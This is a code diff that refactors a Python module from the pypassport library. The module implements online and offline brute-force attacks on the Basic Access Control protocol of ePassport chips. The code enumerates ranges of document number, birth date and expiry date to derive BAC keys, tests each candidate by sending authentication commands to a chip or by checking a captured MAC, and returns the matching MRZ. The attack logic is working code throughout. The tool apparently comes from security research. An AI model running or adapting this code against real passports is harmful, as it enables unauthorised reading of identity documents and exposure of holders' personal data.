@@ -19,25 +19,20 @@
 import os
 import time
 import datetime
+import logging
 import re
 
 from hashlib import sha1
 from Crypto.Cipher import DES3
-from Crypto.Cipher import DES
 
-from pypassport.logger import Logger
-from pypassport.iso7816 import ISO7816, ISO7816Exception
-from pypassport.iso9797 import mac, pad, unpad
-#from pypassport.doc9303.bac import BAC
-from pypassport.reader import ReaderException
-from pypassport.doc9303.mrz import MRZ
-# TODO: pypassport.apdu does not exist; APDU classes live in pypassport.iso7816
-from pypassport.hex_utils import hexToHexRep, binToHexRep, hexRepToBin
+from pypassport.iso7816 import ISO7816, ISO7816Exception, APDUCommand
+from pypassport.iso9797 import mac, pad
+from pypassport.hex_utils import binToHexRep, hexRepToBin
 
 class BruteForceException(Exception):
     pass
 
-class BruteForce(Logger):
+class BruteForce():
     """
     This class performs a brute force attack against the BAC process based on a range of MRZ
     The two main methods are I{exploit} and I{exploitOffline}:
@@ -49,14 +44,13 @@ class BruteForce(Logger):
     KMAC = b'\x00\x00\x00\x02'
 
     def __init__(self, iso7816, activateReader=True):
-        Logger.__init__(self, "BRUTE FORCE")
+        logging.info("BRUTE FORCE")
 
         if activateReader:
             self._iso7816 = iso7816
-            if type(self._iso7816) != type(ISO7816(None)):
+            if not isinstance(self._iso7816, ISO7816):
                 raise BruteForceException("The sublayer iso7816 is not available")
             self._iso7816.rstConnection()
-            #self._bac = BAC(iso7816)
 
         self._id_low = None
         self._id_high = None
@@ -87,15 +81,18 @@ class BruteForce(Logger):
         @type high: String (0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<)
         """
 
-        self.log("Set ID:")
-        self.log("\tLow: {0}".format(low))
-        self.log("\tHigh: {0}".format(high))
+        logging.info("Set ID:")
+        logging.info("\tLow: {0}".format(low))
+        logging.info("\tHigh: {0}".format(high))
 
-        if low==None: low = "0"
+        if low is None:
+            low = "0"
 
-        if high==None:
-            if low=="0": high = "ZZZZZZZZZ"
-            else: high = low
+        if high is None:
+            if low=="0":
+                high = "ZZZZZZZZZ"
+            else:
+                high = low
 
         self._id_low = low.upper()
         self._id_high = high.upper()
@@ -105,9 +102,9 @@ class BruteForce(Logger):
             if value_low > value_high:
                 (self._id_high, self._id_low) = (self._id_low, self._id_high)
 
-        self.log("Effective ID")
-        self.log("\tLow: {0}".format(self._id_low))
-        self.log("\tHigh: {0}".format(self._id_high))
+        logging.info("Effective ID")
+        logging.info("\tLow: {0}".format(self._id_low))
+        logging.info("\tHigh: {0}".format(self._id_high))
 
     def setDOB(self, low=None, high=None):
         """
@@ -119,19 +116,20 @@ class BruteForce(Logger):
         @type high: String (YY/MM/DD)
         """
 
-        self.log("Set Date of birth:")
-        self.log("\tLow: {0}".format(low))
-        self.log("\tHigh: {0}".format(high))
+        logging.info("Set Date of birth:")
+        logging.info("\tLow: {0}".format(low))
+        logging.info("\tHigh: {0}".format(high))
 
         today = datetime.date.today()
 
 
-        if high==None:
-            if low==None:
+        if high is None:
+            if low is None:
                 high = today.strftime("%y%m%d")
-            else: high = None
+            else:
+                high = None
 
-        if low==None:
+        if low is None:
             low_date = datetime.date(today.year-99, today.month, today.day)
             low = low_date.strftime("%y%m%d")
 
@@ -146,9 +144,9 @@ class BruteForce(Logger):
         if self._dob_low > self._dob_high:
             (self._dob_high, self._dob_low) = (self._dob_low, self._dob_high)
 
-        self.log("Effective date of birth:")
-        self.log("\tLow: {0}".format(self._dob_low.strftime("%Y/%m/%d")))
-        self.log("\tHigh: {0}".format(self._dob_high.strftime("%Y/%m/%d")))
+        logging.info("Effective date of birth:")
+        logging.info("\tLow: {0}".format(self._dob_low.strftime("%Y/%m/%d")))
+        logging.info("\tHigh: {0}".format(self._dob_high.strftime("%Y/%m/%d")))
 
     def setExpDate(self, low=None, high=None):
         """
@@ -160,26 +158,27 @@ class BruteForce(Logger):
         @type high: String (YY/MM/DD)
         """
 
-        self.log("Set expriration date:")
-        self.log("\tLow: {0}".format(low))
-        self.log("\tHigh: {0}".format(high))
+        logging.info("Set expriration date:")
+        logging.info("\tLow: {0}".format(low))
+        logging.info("\tHigh: {0}".format(high))
 
         today = datetime.date.today()
         tmp = low
 
-        if low==None:
-            if high==None:
+        if low is None:
+            if high is None:
                 low_date = datetime.date(today.year-10, today.month, today.day)
                 low = low_date.strftime("%y%m%d")
             else:
                 low_date = datetime.date(int(high[:4])-10, int(high[5:7]), int(high[8:10]))
                 low = low_date.strftime("%y%m%d")
 
-        if high==None:
-            if tmp==None:
+        if high is None:
+            if tmp is None:
                 high_date = datetime.date(today.year+10, today.month, today.day)
                 high = high_date.strftime("%y%m%d")
-            else: high = low
+            else:
+                high = low
 
         date_cmp = [self.twodyear(low[0:2]), low[2:4], low[4:6]]
         self._exp_date_low = datetime.date(int(date_cmp[0]), int(date_cmp[1]), int(date_cmp[2]))
@@ -190,9 +189,9 @@ class BruteForce(Logger):
         if self._exp_date_low > self._exp_date_high:
             (self._exp_date_high, self._exp_date_low) = (self._exp_date_low, self._exp_date_high)
 
-        self.log("Effective expiration date:")
-        self.log("\tLow: {0}".format(self._exp_date_low.strftime("%Y/%m/%d")))
-        self.log("\tHigh: {0}".format(self._exp_date_high.strftime("%Y/%m/%d")))
+        logging.info("Effective expiration date:")
+        logging.info("\tLow: {0}".format(self._exp_date_low.strftime("%Y/%m/%d")))
+        logging.info("\tHigh: {0}".format(self._exp_date_high.strftime("%Y/%m/%d")))
 
     def check(self):
         """
@@ -201,7 +200,7 @@ class BruteForce(Logger):
         @return: A boolean whether the paramaters are set properly
         """
 
-        self.log("Check:")
+        logging.info("Check:")
 
         check = True
         error = ''
@@ -211,29 +210,29 @@ class BruteForce(Logger):
         if not reg.match(self._id_low):
             check = False
             error += "Wrong parameter (ID low: {0})\n".format(self._id_low)
-            self.log("\tWrong ID low")
+            logging.info("\tWrong ID low")
         if not reg.match(self._id_high):
             check = False
             error += "Wrong parameter (ID high: {0})\n".format(self._id_high)
-            self.log("\tWrong ID high")
+            logging.info("\tWrong ID high")
 
-        if type(self._dob_low) != type(datetime.date.today()):
+        if not isinstance(self._dob_low, datetime.date):
             check = False
             error += "dob l\n"
             error += "Wrong parameter (date of birth low: {0})\n".format(self._dob_low)
-        if type(self._dob_high) != type(datetime.date.today()):
+        if not isinstance(self._dob_high, datetime.date):
             check = False
             error += "dob h\n"
             error += "Wrong parameter (date of birth high: {0})\n".format(self._dob_high)
 
-        if type(self._exp_date_low) != type(datetime.date.today()):
+        if not isinstance(self._exp_date_low, datetime.date):
             check = False
             error += "Wrong parameter (Expiratin date low: {0})\n".format(self._exp_date_low)
-            self.log("\tWrong expiration date low")
-        if type(self._exp_date_high) != type(datetime.date.today()):
+            logging.info("\tWrong expiration date low")
+        if not isinstance(self._exp_date_high, datetime.date):
             check = False
             error += "Wrong parameter (Expiratin date high: {0})\n".format(self._exp_date_high)
-            self.log("\tWrong expiration date high")
+            logging.info("\tWrong expiration date high")
 
         return check, error
 
@@ -421,8 +420,8 @@ class BruteForce(Logger):
 
         s = rnd_ifd + rnd_icc + kifd
 
-        tdes= DES3.new(kenc,DES.MODE_CBC, b'\x00\x00\x00\x00\x00\x00\x00\x00')
-        eifd= tdes.encrypt(s)
+        tdes = DES3.new(kenc, DES3.MODE_CBC, b'\x00\x00\x00\x00\x00\x00\x00\x00')
+        eifd = tdes.encrypt(s)
 
         mifd = mac(kmac, pad(eifd))
 
@@ -434,10 +433,7 @@ class BruteForce(Logger):
         """
         @note: Code fragment from the pyPassport.doc9303.bac.BAC class
         """
-        data = binToHexRep(cmd_data)
-        lc = hexToHexRep(len(data)//2)
-        toSend = self._iso7816.APDUCommand("00", "82", "00", "00", lc, data, "28")
-
+        toSend = APDUCommand("00", "82", "00", "00", data=cmd_data, le="28")
         return self._iso7816.transmit(toSend, "Mutual Authentication")
 
 
@@ -485,8 +481,8 @@ class BruteForce(Logger):
         @return: The MRZ found (or False if not found)
         """
 
-        self.log("Online exploit:")
-        self.log("\tStart")
+        logging.info("Online exploit:")
+        logging.info("\tStart")
 
         found = False
         cur_id = self._id_low
@@ -504,7 +500,7 @@ class BruteForce(Logger):
                 while not found:
 
                     mrz = self._buildMRZ(cur_id, cur_dob.strftime("%y%m%d"), cur_exp.strftime("%y%m%d"))
-                    self.log("\tTry: {0}".format(mrz))
+                    logging.info("\tTry: {0}".format(mrz))
                     kmrz = cur_id + (9-len(cur_id))*'<' + self._calculCheckDigit(cur_id) + cur_dob.strftime("%y%m%d") + self._calculCheckDigit(cur_dob.strftime("%y%m%d")) + cur_exp.strftime("%y%m%d") + self._calculCheckDigit(cur_exp.strftime("%y%m%d"))
                     kseed = self._genKseed(kmrz)
                     kenc = self._keyDerivation(kseed, BruteForce.KENC)
@@ -515,10 +511,10 @@ class BruteForce(Logger):
                     try:
                         self._sendCmdData(self._authentication(rnd_icc, kenc, kmac))
                         found = mrz
-                        self.log("\tFound!")
+                        logging.info("\tFound!")
                     except ISO7816Exception:
-                        if reset: self._iso7816.rstConnection()
-                        pass
+                        if reset:
+                            self._iso7816.rstConnection()
 
                     if cur_exp == max_exp:
                         break
@@ -532,7 +528,7 @@ class BruteForce(Logger):
                 break
             cur_id = self._nextIdValue(cur_id)
 
-        self.log("\tTime: {0}".format(time.time()-starttime))
+        logging.info("\tTime: {0}".format(time.time()-starttime))
         return found
 
 
@@ -557,8 +553,8 @@ class BruteForce(Logger):
         @return: The MRZ found (or False if not found)
         """
 
-        self.log("Offline exploit:")
-        self.log("\tStart")
+        logging.info("Offline exploit:")
+        logging.info("\tStart")
 
         message_bin = hexRepToBin(response[:64])
         mac_bin = hexRepToBin(response[64:])
@@ -579,7 +575,7 @@ class BruteForce(Logger):
                 while not found:
 
                     mrz = self._buildMRZ(cur_id, cur_dob.strftime("%y%m%d"), cur_exp.strftime("%y%m%d"))
-                    self.log("\tTry: {0}".format(mrz))
+                    logging.info("\tTry: {0}".format(mrz))
                     kmrz = cur_id + (9-len(cur_id))*'<' + self._calculCheckDigit(cur_id) + cur_dob.strftime("%y%m%d") + self._calculCheckDigit(cur_dob.strftime("%y%m%d")) + cur_exp.strftime("%y%m%d") + self._calculCheckDigit(cur_exp.strftime("%y%m%d"))
                     kseed = self._genKseed(kmrz)
                     #kenc = self._keyDerivation(kseed, BruteForce.KENC)
@@ -587,7 +583,7 @@ class BruteForce(Logger):
 
                     if  mac_bin == mac(kmac, pad(message_bin)):
                         found = mrz
-                        self.log("\tFound!")
+                        logging.info("\tFound!")
 
                     if cur_exp == max_exp:
                         break
@@ -600,6 +596,6 @@ class BruteForce(Logger):
             if cur_id == max_id:
                 break
             cur_id = self._nextIdValue(cur_id)
-        self.log("\tTime: {0}".format(time.time()-starttime))
+        logging.info("\tTime: {0}".format(time.time()-starttime))
         return found
 
